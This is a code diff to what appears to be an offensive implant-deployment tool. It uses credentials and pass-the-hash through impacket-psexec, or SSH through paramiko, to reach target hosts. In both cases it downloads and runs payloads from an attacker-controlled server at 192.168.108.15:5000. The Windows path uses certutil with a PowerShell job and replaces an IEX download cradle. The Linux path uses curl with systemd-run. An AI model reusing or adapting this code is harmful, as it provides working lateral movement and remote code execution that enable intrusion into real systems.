@@ -2,6 +2,7 @@ import pwn
 import hashlib, binascii
 import base64
 import paramiko
+import os
 
 # Custom imports
 import implants
@@ -36,15 +37,9 @@ With valid credentials, psexec and run implant code
 """
 def psexec(username, password, target, FLASK_HOST, FLASK_PORT):
     ntlm = binascii.hexlify(hashlib.new('md4', password.encode('utf-16le')).digest()).decode(encoding="utf-8")
-    payload = f'IEX(New-Object Net.WebClient).downloadString("http://{FLASK_HOST}:{FLASK_PORT}/static/win.ps1")'
-    b64 = base64.b64encode(payload.encode("utf-16")[2:]).decode("utf-8")
-    cmd = f"powershell -e {b64}\n"
-
-    p = pwn.process(["/usr/bin/impacket-psexec", "-hashes", f":{ntlm}", f"{username}:'{password}'@{target}"], stdin=pwn.PTY)
-    print(p.readuntil(">"))
-    p.send(cmd.encode())
-    p.send(b'\4')
-    print(p.readuntil("Checking"))
+    cmd = r'powershell /c certutil.exe -f -split -urlcache http://192.168.108.15:5000/static/win.ps1 C:\programdata\win.ps1; start-job -filepath C:\programdata\win.ps1'
+    print(cmd)
+    os.system(f"timeout 20 /usr/bin/impacket-psexec -hashes :{ntlm} {username}@{target} '{cmd}'")
 
 def ssh(username, password, target, FLASK_HOST, FLASK_PORT):
     client = paramiko.SSHClient()
@@ -56,7 +51,7 @@ def ssh(username, password, target, FLASK_HOST, FLASK_PORT):
         print("Connection successful!")
 
         # Run a command
-        command = f"curl http://{FLASK_HOST}:{FLASK_PORT}/static/lin | base64 -d | bash"
+        command = f"curl -s http://{FLASK_HOST}:{FLASK_PORT}/static/lin > /tmp/agent;systemd-run --unit=agent bash /tmp/agent"
         stdin, stdout, stderr = client.exec_command(command)
 
         # Close the connection
@@ -66,4 +61,4 @@ def ssh(username, password, target, FLASK_HOST, FLASK_PORT):
         print(f"Error occurred: {e}")
 
 if __name__=="__main__":
-    ssh("root", "password", "192.168.108.19", "192.168.108.15", "5000")
+    psexec("administrator", "password", "192.168.108.14", "192.168.108.15", "5000")
